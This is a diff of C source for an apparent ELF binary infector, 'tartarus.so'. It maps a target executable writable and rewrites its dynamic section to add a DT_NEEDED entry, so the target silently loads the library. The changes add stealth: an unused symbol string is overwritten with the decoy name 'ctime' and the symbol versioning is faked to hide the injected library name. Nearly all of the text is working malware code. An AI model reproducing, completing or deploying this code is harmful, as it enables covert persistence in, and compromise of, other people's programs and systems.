@@ -13,10 +13,11 @@
 #define lib "./test.so"
 #define self "tartarus.so"
 #define target "./tmp"
+#define sub "ctime"
 
 const char interp[] __attribute__((section(".interp"))) = "/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2";
 
-void entry(){ // need to find a portable solution for parameter passing here...can get rid of the hard coded strings above if so
+void entry(){ // todo: use auxv to get envp, argc, argv
   int fd = open(target, O_RDWR);
   void* base = mmap(NULL, 0x300000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0); // file backed shared memory mapping so changes reflect in file
   
@@ -32,15 +33,25 @@ void entry(){ // need to find a portable solution for parameter passing here...c
   char* strtab = (char*)(base + shstrtab->sh_offset);
   
   unsigned int dynstr_size = 0;
+
+  Elf64_Sym* dyn_sym = NULL;
+  unsigned int sym_cnt = 0;
   
   Elf64_Dyn* dynamic = NULL;
   unsigned int dyn_cnt = 0;
   
   int flag = 0;
+
+  Elf64_Half* versym = NULL;
   
   // find needed sections
   for(int i = 0; i < ehdr->e_shnum && (dyn_str == NULL || dynamic == NULL); ++i){
-    if(shdr->sh_type == SHT_STRTAB && !strcmp(&strtab[shdr->sh_name], ".dynstr")){
+    if(shdr->sh_type == SHT_GNU_versym){
+      versym = (Elf64_Half*)((char*)ehdr + shdr->sh_offset);
+    }else if(shdr->sh_type == SHT_DYNSYM && !strcmp(&strtab[shdr->sh_name], ".dynsym")){
+      dyn_sym = (Elf64_Sym*)((char*)ehdr + shdr->sh_offset);
+      sym_cnt = shdr->sh_size / sizeof(Elf64_Sym);
+    }else if(shdr->sh_type == SHT_STRTAB && !strcmp(&strtab[shdr->sh_name], ".dynstr")){
       dyn_str = (char*)ehdr + shdr->sh_offset;
       dynstr_size = shdr->sh_size;
     }else if(shdr->sh_type == SHT_DYNAMIC && !strcmp(&strtab[shdr->sh_name], ".dynamic")){
@@ -53,14 +64,23 @@ void entry(){ // need to find a portable solution for parameter passing here...c
     shdr++;
   }
   
-  // replace __gmon_start__ with SO name (14 char len) NOTE: _ITM_* strings provide 24 & 27 chars to work with
+  // TODO: add logic so backup substitution strings can be used if the chosen can not be found
   char* str = dyn_str + 1; // 1st entry is null, skip over
-  while(1){ // so far it seems that gcc, clang and even tcc provide the __gmon_start__ string....may suffice to only use it, TBD
-    if(!strcmp(str, "__gmon_start__")){
-      str[0] = '.';
-      str[1] = '\0';
-      // now '.' will show up in .dynsym instead of soname (maybe find even more covert string replacement?)
-      strcpy(&str[2], self);
+  while(1){ // so far it seems that gcc, clang and even tcc provide a few symbols that are not needed under normal execution
+    if(!strcmp(str, "_ITM_deregisterTMCloneTable")){
+      strcpy(str, sub); // insert substituted symbol name
+      // now sub will show up in .dynsym instead of soname
+      strcpy(&str[strlen(sub)+1], self);
+      // find dynsym entry and patch to match a normal global symbol
+      for(unsigned int i = 0; i < sym_cnt; ++i){
+       if(dyn_sym[i].st_name == (str - dyn_str)){
+         // NOTE: fix this later, currently segfaults
+         //dyn_sym[i].st_info = STT_FUNC | STB_GLOBAL;
+         //dyn_sym[i].st_other = STV_DEFAULT;
+         versym[i] = 2; // specify fake version requirements, TODO: add logic to ensure library listing will match sub string
+         break;
+       }
+      }
       break;
     }
     str += strlen(str) + 1;
@@ -81,13 +101,13 @@ void entry(){ // need to find a portable solution for parameter passing here...c
     // for shifting Dyn array down 1 to add new dt_needed field at the top instead of dt_debug->dt_needed
     memmove(dynamic + needed_offset + 1, dynamic + needed_offset, (dyn_cnt - needed_offset) * sizeof(Elf64_Dyn));
     dynamic[needed_offset].d_tag = DT_NEEDED;
-    dynamic[needed_offset].d_un.d_val = &str[2] - dyn_str;
+    dynamic[needed_offset].d_un.d_val = &str[strlen(sub)+1] - dyn_str;
   }else{
     // loop through Dyn struct array to find dt_debug field converting dt_debug->dt_needed
     for(int i = 0; i < dyn_cnt; ++i){
       if(dynamic->d_tag == DT_DEBUG){
 	dynamic->d_tag = DT_NEEDED;
-	dynamic->d_un.d_val = &str[2] - dyn_str;
+	dynamic->d_un.d_val = &str[strlen(sub)+1] - dyn_str;
 	break;
       }
       dynamic++;
